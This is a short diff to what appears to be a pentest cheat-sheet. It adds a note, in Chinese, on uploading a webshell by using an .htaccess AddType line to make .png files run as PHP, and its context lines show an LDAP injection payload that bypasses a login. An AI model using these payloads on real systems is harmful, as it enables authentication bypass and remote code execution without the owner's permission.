@@ -79,3 +79,9 @@ pass = any))
 username=admin))(|(|
 password=any
 --> (&(uid=admin)) (| (|) (webpassword=any))
+
+# webshell
+.htaccess文件
+AddType指定
+AddType application/x-httpd-php .png
+将.png当作php文件解析
